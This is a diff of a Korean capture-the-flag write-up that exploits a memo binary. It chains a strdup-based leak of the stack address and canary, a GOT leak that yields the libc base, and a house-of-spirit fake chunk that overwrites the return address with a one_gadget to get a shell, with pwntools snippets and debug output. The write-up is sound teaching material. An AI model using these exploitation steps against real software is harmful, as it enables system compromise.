@@ -28,12 +28,12 @@ __int64 __fastcall alloc(char *a1)
 ...
     if ( read(0, *((void **)a1 + 3), 0x30uLL) <= 0 )
 ```
-위 함수는 데이터를 입력받고
-`strdup()` 를 이용한 메모리 할당을 한다.
-그리고 다시 한번 입력할 수도 있다. (`"Are you done? [yes/no] "`)
-`read()` 길이는 `0x30` 으로 고정되어있다.
-
-`strdup()` 함수는 동적 할당할 크기를 `strlen()` 을 통해서 정한다.
+위 함수는 데이터를 입력받고  
+`strdup()` 를 이용한 메모리 할당을 한다.  
+그리고 다시 한번 입력할 수도 있다. (`"Are you done? [yes/no] "`)  
+`read()` 길이는 `0x30` 으로 고정되어있다.  
+  
+`strdup()` 함수는 동적 할당할 크기를 `strlen()` 을 통해서 정한다.  
 ```
 /* Duplicate S, returning an identical malloc'd string.  */
 char* __strdup (const char *s)
@@ -47,20 +47,20 @@ char* __strdup (const char *s)
   return (char *) memcpy (new, s, len);
 }
 ```
-`strlen()` 은 `NULL` byte 가 나올때까지 길이를 측정하므로
+`strlen()` 은 `NULL` byte 가 나올때까지 길이를 측정하므로  
 ```
 buf    -> 0x00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 canary -> 0x10: 00 de ad be
 ```
-`canary` 앞까지의 `NULL` byte 를 덮어씌워준다면 ( `"A"*0x11` )
+`canary` 앞까지의 `NULL` byte 를 덮어씌워준다면 ( `"A"*0x11` )  
 ```
 buf    -> 0x00: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
 canary -> 0x10: 41 de ad be
 ```
-실제론 `0x11` 만큼만 입력했지만
-`strlen()` 은 `0x14` 만큼을 측정하게 되어 `malloc()` 한다.
-
-이 `strdup()` 로 인해서 현재 **스택의 주소(ASLR 우회)**와 **canary(SSP 해제)** 를 leak 할 수 있다.
+실제론 `0x11` 만큼만 입력했지만  
+`strlen()` 은 `0x14` 만큼을 측정하게 되어 `malloc()` 한다.  
+  
+이 `strdup()` 로 인해서 현재 **스택의 주소(ASLR 우회)**와 **canary(SSP 해제)** 를 leak 할 수 있다.  
 
 ## 취약점 2: pointer 조작을 통한 GOT leak (BOF)
 ```
@@ -71,8 +71,8 @@ canary -> 0x10: 41 de ad be
 [4] Tap out
 >
 ```
-처음 프로그램을 시작하면 `menu()` 를 띄우는데
-`[4] Tap out` 을 누르면
+처음 프로그램을 시작하면 `menu()` 를 띄우는데  
+`[4] Tap out` 을 누르면  
 ```
 ...
         alloc((__int64)&buf);
@@ -81,10 +81,10 @@ canary -> 0x10: 41 de ad be
     if ( read(0, &buf, 0x30uLL) <= 0 )
 ...
 ```
-`"Giving up already? ~"` 하면서 `read()` 한다.
-이때 `buf` 에 0x30 을 받을 수 있게 되는데
-( alloc() 에서 똑같은 read(0, ,0x30) 이 있지만 이후에 (&buf + 0x18) 에 주소를 초기화시키기 때문에 이용할 수가 없다. )
-`(&buf + 0x18)` 는 `dump()` 할 때의 참조하는 주소가 저장되는 곳이다.
+`"Giving up already? ~"` 하면서 `read()` 한다.  
+이때 `buf` 에 0x30 을 받을 수 있게 되는데  
+( alloc() 에서 똑같은 read(0, ,0x30) 이 있지만 이후에 (&buf + 0x18) 에 주소를 초기화시키기 때문에 이용할 수가 없다. )  
+`(&buf + 0x18)` 는 `dump()` 할 때의 참조하는 주소가 저장되는 곳이다.  
 ```
 mov     rax, [rbp+var_18]
 mov     rdi, rax
@@ -94,14 +94,14 @@ buf = rbp-0x30
 var_18 = rbp-0x18
 buf + 0x18 = var_18
 ```
-즉 `(&buf + 0x18)` 에 leak 하고 싶은 주소값을 넣기만하면
-그 주소에 저장되어 있는 데이터를 볼 수 있게된다.
-우리는 `puts@GOT` 를 leak 해서 **libc 의 base 주소**를 계산하고
-gadget 을 모을 것이다.
+즉 `(&buf + 0x18)` 에 leak 하고 싶은 주소값을 넣기만하면  
+그 주소에 저장되어 있는 데이터를 볼 수 있게된다.  
+우리는 `puts@GOT` 를 leak 해서 **libc 의 base 주소**를 계산하고  
+gadget 을 모을 것이다.  
 
 ## 취약점 3: house of spirit
-취약점 1,2 만으로 RET 를 덮을 수 없다.
-`buf` 가 `rbp-0x30` 인데 read(,, 0x30) 이기 때문이다. ( 0x10 bytes 모자라다 )
+취약점 1,2 만으로 RET 를 덮을 수 없다.  
+`buf` 가 `rbp-0x30` 인데 read(,, 0x30) 이기 때문이다. ( 0x10 bytes 모자라다 )  
 ```
 buf -> 0x00: 00000000 00000000 00000000 00000000
        0x10: 00000000 00000000 00000000 00000000
@@ -114,11 +114,11 @@ mov     rax, [rbp+var_18]
 mov     rdi, rax
 call    del
 ```
-`del()` 은 `free()` 하는 녀석이고
-매개변수로 BOF 를 통해 변조할 수 있는 `var_18` 이 들어간다.
-스택에 fake chunk 를 만들어서 `free()` 하게되면
-다음 `malloc()` 시에 fastbin 에서 할당 주소를 가져오게 되는 취약점을 이용해서
-RET 역시 변조할 수 있게 된다.
+`del()` 은 `free()` 하는 녀석이고  
+매개변수로 BOF 를 통해 변조할 수 있는 `var_18` 이 들어간다.  
+스택에 fake chunk 를 만들어서 `free()` 하게되면  
+다음 `malloc()` 시에 fastbin 에서 할당 주소를 가져오게 되는 취약점을 이용해서  
+RET 역시 변조할 수 있게 된다.  
 ```
 buf    ->   0x00: 00000000 00000000 00000000 00000000
 malloc() -> 0x10: 00000000 00000000 00000000 00000000
@@ -127,7 +127,7 @@ malloc() -> 0x10: 00000000 00000000 00000000 00000000
 ```
 
 # Exploit
-1. 스택 주소와 canary leak
+1. 스택 주소와 canary leak  
 ```
 0x7fff04a4d1c0: 0x0000000000000000      0x0000000000000000
 0x7fff04a4d1d0: 0x0000000000400e20      0x0000000000400870
@@ -137,8 +137,8 @@ malloc() -> 0x10: 00000000 00000000 00000000 00000000
 0x7fff04a4d1e0 -> buf+0x110
 0x7fff04a4d1e8 -> canary
 ```
-`read()` 하기 직전의 `buf` 의 모습이다.
-`0x20` 만큼 데이터를 넣으면 `strdup()` 의 `strlen()` 이 길이를 잘못 재서 뒤의 데이터도 딸려온다.
+`read()` 하기 직전의 `buf` 의 모습이다.  
+`0x20` 만큼 데이터를 넣으면 `strdup()` 의 `strlen()` 이 길이를 잘못 재서 뒤의 데이터도 딸려온다.  
 ```
     alloc('A'*0x20)
     buf = show(0x20) - 0x110
@@ -148,7 +148,7 @@ malloc() -> 0x10: 00000000 00000000 00000000 00000000
 0x20d1020:      0x4141414141414141      0x4141414141414141
 0x20d1030:      0x00007fff04a4d2d0      0x0000000000020fd1
 ```
-이제 출력시키면 된다.
+이제 출력시키면 된다.  
 ```
 [DEBUG] Received 0x2d bytes:
     00000000  44 61 74 61  3a 20 41 41  41 41 41 41  41 41 41 41  │Data│: AA│AAAA│AAAA│
@@ -157,10 +157,10 @@ malloc() -> 0x10: 00000000 00000000 00000000 00000000
     0000002d
 [+] Buffer: 0x7fff04a4d1c0
 ```
-
-`canary` 도 똑같은 방법으로 leak 하면 된다.
-
-2. GOT leak
+  
+`canary` 도 똑같은 방법으로 leak 하면 된다.  
+  
+2. GOT leak  
 ```
     giveup('no'.ljust(24,'\x00')+p64(memo.got['puts']))
     libc = show(0) - elf.symbols['puts']
@@ -170,7 +170,7 @@ malloc() -> 0x10: 00000000 00000000 00000000 00000000
 0x7fff04a4d1e0: 0x4242424242424242      0x136fe51ca293f142
 0x7fff04a4d1f0: 0x0000000000400e20      0x00007f4af3297561
 ```
-메뉴 4번으로 `(&buf + 0x18)` 을 `puts@GOT` 로 바꾸고 출력해주면
+메뉴 4번으로 `(&buf + 0x18)` 을 `puts@GOT` 로 바꾸고 출력해주면  
 ```
 .text:0000000000400C6B <dump+16>       mov     rsi, rax
 .text:0000000000400C6E <dump+19>       mov     edi, offset aDataS ; "Data: %s\n"
@@ -186,8 +186,8 @@ RSI  0x601f90 (_GLOBAL_OFFSET_TABLE_+32) —▸ 0x7f4af32e1170 (puts)
     0000000d
 [+] Libc: 0x7f4af3277000
 ```
-
-3. house of spirit
+  
+3. house of spirit  
 ```
     exp = 'no\x00'.ljust(8, 'C')
     exp += p64(0x20)
@@ -211,7 +211,7 @@ RSI  0x601f90 (_GLOBAL_OFFSET_TABLE_+32) —▸ 0x7f4af32e1170 (puts)
 
 RDI  0x7fff04a4d1d0 ◂— 0x0
 ```
-free() 할 주소가 스택이다.
+free() 할 주소가 스택이다.  
 ```
 fastbins
 0x20: 0x7fff04a4d1c0 ◂— 0x0
@@ -222,8 +222,8 @@ fastbins
 0x70: 0x0
 0x80: 0x0
 ```
-이제 똑같이 `0x20` 만큼 할당하게 되면 fastbin 에서 가져오게 된다.
-
+이제 똑같이 `0x20` 만큼 할당하게 되면 fastbin 에서 가져오게 된다.  
+  
 ```
     alloc('D\x00', 'no\x00')
     one_gadget = 0x40beb
@@ -234,8 +234,8 @@ fastbins
 0x7fff04a4d1e0: 0x0000000000000000      0x136fe51ca293f100
 0x7fff04a4d1f0: 0x4545454545454545      0x00007f4af32b7beb
 ```
-RET 를 shell 떨구는 gadget 주소로 변조시켰다.
-
+RET 를 shell 떨구는 gadget 주소로 변조시켰다.  
+  
 ```
 [+] Buffer: 0x7fff04a4d1c0
 [+] Canary: 0x136fe51ca293f100
